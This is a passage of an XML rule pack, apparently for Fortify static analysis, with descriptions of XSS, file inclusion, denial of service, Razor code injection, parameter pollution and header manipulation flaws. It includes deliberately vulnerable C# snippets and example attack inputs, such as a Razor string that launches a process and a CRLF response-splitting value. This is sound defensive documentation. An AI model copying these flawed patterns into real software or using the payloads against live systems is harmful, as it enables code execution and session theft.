commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Examples 1 and 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Examples 3 and 4, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. ASP.NET Request Validation and WCF are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. In case of ASP.NET Request Validation, we also provide evidence for when validation is explicitly disabled. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5]  <em>Anti-Cross Site Scripting Library</em> MSDN<br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[13]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[22] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[23]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_dangerous_file_inclusion</key>
    <internalKey>Input Validation and Representation/Dangerous File Inclusion</internalKey>
    <name>Dangerous File Inclusion</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing unvalidated user input to control files that are included dynamically in a HTML file can lead to malicious code execution.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> The following code takes a user specified template name and includes it in the HTML page to be rendered.<br><br><pre><br>...<br>ClientScript.RegisterClientScriptInclude("RequestParameterScript", HttpContext.Current.Request.Params["includedURL"]);<br>...<br></pre><br><br>In the above example, an attacker can take complete control of the dynamic include statement by supplying a malicious value for <code>includedURL</code> that causes the program to include a file from an external site.<br><br>If the attacker specifies a valid file to a dynamic include statement, .NET will insert the contents of that file into the HTML file sent to the user. In the case of a plain text file, such as <code>web.config</code>, the file might be rendered as part of the HTML output. Worse, if the attacker can specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94, CWE ID 98</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 094</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 098</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 829</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_denial_of_service</key>
    <internalKey>Input Validation and Representation/Denial of Service</internalKey>
    <name>Denial of Service</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An attacker could cause the program to crash or otherwise become unavailable to legitimate users.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Attackers may be able to deny service to legitimate users by flooding the application with requests, but flooding attacks can often be defused at the network layer. More problematic are bugs that allow an attacker to overload the application using a small number of requests. Such bugs allow the attacker to specify the quantity of system resources their requests will consume or the duration for which they will use them.<br><br><b>Example 1:</b> The following code allows a user to specify the amount of time for which a thread will sleep. By specifying a large number, an attacker can tie up the thread indefinitely. With a small number of requests, the attacker can deplete the application's thread pool.<br><br><pre><br>  int usrSleepTime = Int32.Parse(usrInput);<br>  Thread.Sleep(usrSleepTime);<br></pre><br><br><b>Example 2:</b> The following code reads a String from a zip file. Because it uses the <code>ReadLine()</code> method, it will read an unbounded amount of input. An attacker can take advantage of this code to cause an <code>OutOfMemoryException</code> or to consume a large amount of memory so that the program spends more time performing garbage collection or runs out of memory during some subsequent operation.<br><br><pre><br>   using (StreamReader sr = new StreamReader("file.zip"))<br>   {<br>      String line;<br>      line = sr.ReadLine();<br>	 ...<br>   }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_denial_of_service_routing</key>
    <internalKey>Input Validation and Representation/Denial of Service/Routing</internalKey>
    <name>Denial of Service: Routing</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An attacker could cause the program to crash or otherwise become unavailable to legitimate users.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Attackers may be able to deny service to legitimate users by flooding the application with requests, but flooding attacks can often be defused at the network layer. More problematic are bugs that allow an attacker to overload the application using a small number of requests. Such bugs allow the attacker to specify the quantity of system resources their requests will consume or the duration for which they will use them.<br><br><b>Example 1:</b> The following code allows a user to specify the amount of time for which a thread will sleep. By specifying a large number, an attacker can tie up the thread indefinitely. With a small number of requests, the attacker can deplete the application's thread pool.<br><br><pre><br>  int usrSleepTime = Int32.Parse(usrInput);<br>  Thread.Sleep(usrSleepTime);<br></pre><br><br><b>Example 2:</b> The following code reads a String from a zip file. Because it uses the <code>ReadLine()</code> method, it will read an unbounded amount of input. An attacker can take advantage of this code to cause an <code>OutOfMemoryException</code> or to consume a large amount of memory so that the program spends more time performing garbage collection or runs out of memory during some subsequent operation.<br><br><pre><br>   using (StreamReader sr = new StreamReader("file.zip"))<br>   {<br>      String line;<br>      line = sr.ReadLine();<br>         ...<br>   }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_dynamic_code_evaluation_script_injection</key>
    <internalKey>Input Validation and Representation/Dynamic Code Evaluation/Script Injection</internalKey>
    <name>Dynamic Code Evaluation: Script Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Interpreting user-controlled instructions at run-time can allow attackers to execute malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern programming languages allow dynamic interpretation of source instructions. This capability allows programmers to perform dynamic instructions based on input received from the user. Code injection vulnerabilities occur when the programmer incorrectly assumes that instructions supplied directly from the user will perform only innocent operations, such as performing simple calculations on active user objects or otherwise modifying the user's state. However, without proper validation, a user might specify operations the programmer does not intend.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example 1:</b> In this code injection example, a request parameter is bound into a razor template which is evaluated.<br><br><pre><br>...<br>	string name = Request["username"];<br>	string template = "Hello @Model.Name! Welcome " + name + "!";<br>	string result = Razor.Parse(template, new { Name = "World" });<br>...<br></pre><br><br>The program behaves correctly when the <code>operation</code> parameter is a benign value, such as &quot;John&quot;, in which case the <code>result</code> variable is assigned a value of "Hello World!  Welcome John!". However, if an attacker specifies languages operations that are both valid and malicious, those operations would be executed with the full privilege of the parent process. Such attacks are even more dangerous when the underlying language provides access to system resources or allows execution of system commands. For example, Razor allows invocation of C# objects; if an attacker were to specify &quot; @{ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.EnableRaisingEvents=false; proc.StartInfo.FileName=\"calc\"; proc.Start(); }&quot; as the value of  <code>name</code>, a system command would be executed on the host system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_http_parameter_pollution</key>
    <internalKey>Input Validation and Representation/HTTP Parameter Pollution</internalKey>
    <name>HTTP Parameter Pollution</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Concatenating unvalidated input into a URL can allow an attacker to override the value of a request parameter.  Attacker may be able to override existing parameter values, inject a new parameter or exploit variables out of a direct reach.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  HTTP Parameter Pollution (HPP) attacks consist of injecting encoded query string delimiters into other existing parameters. If a web application does not properly sanitize the user input, a malicious user may compromise the logic of the application to perform either client-side or server-side attacks. By submitting additional parameters to a web application, and if these parameters have the same name as an existing parameter, the web application may react in one of the following ways:<br><br>    It may only take the data from the first parameter<br>    It may take the data from the last parameter<br>    It may take the data from all parameters and concatenate them together<br><br><pre><br>Technology/HTTP back-end                  | Overall Parsing Result                    | Example          |<br>ASP.NET/IIS                               | All occurrences of the specific parameter | par1=val1|val2   |<br>ASP/IIS                                   | All occurrences of the specific parameter | par1=val1|val2   |<br>PHP/Apache                                | Last occurrence                           | par1=val2        |<br>JSP Servlet/Apache Tomcat                 | First occurrence                          | par1=val1        |<br>JSP Servlet/Oracle Application Server 10g | First occurrence                          | par1=val1        |<br>IBM HTTP Server                           | First occurrence                          | par1=val1        |<br>mod_perl/Apache                           | Becomes an array                          | ARRAY(0x8b9059c) |<br></pre><br><br><b>Example 1:</b> Depending on the application server and the logic of the application itself, the following request might cause confusion to the authentication system and allow an attacker to impersonate another user.<br>http://www.server.com/login.aspx?name=alice&amp;name=hacker<br><br><b>Example 2:</b> The following code uses input from an HTTP request to render two hyperlinks.<br><pre><br>    ...<br>    String lang = Request.Form["lang"];<br>    WebClient client = new WebClient();<br>    client.BaseAddress = url;<br>    NameValueCollection myQueryStringCollection = new NameValueCollection();<br>    myQueryStringCollection.Add("q", lang);<br>    client.QueryString = myQueryStringCollection;<br>    Stream data = client.OpenRead(url);<br>    ...<br></pre><br><br>URL:  http://www.host.com/election.aspx?poll_id=4567<br>Link1:  &lt;a href="http://www.host.com/vote.aspx?poll_id=4567&amp;lang=en"&gt;English&lt;a&gt;<br>Link2:  &lt;a href="http://www.host.com/vote.aspx?poll_id=4567&amp;lang=es"&gt;Spanish&lt;a&gt;<br><br>The programmer has not considered the possibility that an attacker could provide a <code>lang</code> such as <code>en&amp;poll_id=1</code>, and then the attacker may be able to change the <code>poll_id</code> at will.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 235</em> <br></p>
																									   <p>[6]  <em>HTTP Parameter Pollution</em> Luca Carettoni, Independent Researcher & Stefano Di Paola, MindedSecurity<br></p>
																									   <p>[7]  <em>HTTP Parameter Pollution Vulnerabilities in Web Applications</em> Marco `embyte Balduzzi<br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_header_manipulation</key>
    <internalKey>Input Validation and Representation/Header Manipulation</internalKey>
    <name>Header Manipulation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Including unvalidated data in an HTTP response header can enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Header Manipulation vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source, most frequently an HTTP request.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2. The data is included in an HTTP response header sent to a web user without being validated.<br><br>As with many software security vulnerabilities, Header Manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP response header.<br><br>One of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.<br><br>Many of today's modern application servers and frameworks will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Microsoft's .NET framework will convert CR, LF, and NULL characters to %0d, %0a and %00 when they are sent to the <code>HttpResponse.AddHeader()</code> method. If you are using the latest .NET framework that prevents setting headers with new line characters, then your application might not be vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.<br><br><b>Example:</b> The following code segment reads the name of the author of a weblog entry, <code>author</code>, from an HTTP request and sets it in a cookie header of an HTTP response.<br><br><pre><br>protected System.Web.UI.WebControls.TextBox Author;<br>...<br>string author = Author.Text;<br>Cookie cookie = new Cookie("author", author);<br>...<br></pre><br><br>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Jane Smith<br>...<br></pre><br><br>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for <code>Author.Text</code> does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Wiley Hacker<br><br>HTTP/1.1 200 OK<br>...<br></pre><br><br>Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting and page hijacking.<br><br><b>Cross-User Defacement:</b> An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.<br><br><b>Cache Poisoning:</b> The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.<br><br><b>Cross-Site Scripting:</b> Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.<br><br><b>Page Hijacking:</b> In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.<br><br><b>Cookie Manipulation:</b> When combined with attacks like Cross-Site Request Forgery, attackers can change, add to, or even overwrite a legitimate user's cookies.<br><br><b>Open Redirect:</b> Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[12] D. Crab <em>HTTP Response Splitting</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>HTTP Response Splitting</em> <br></p>
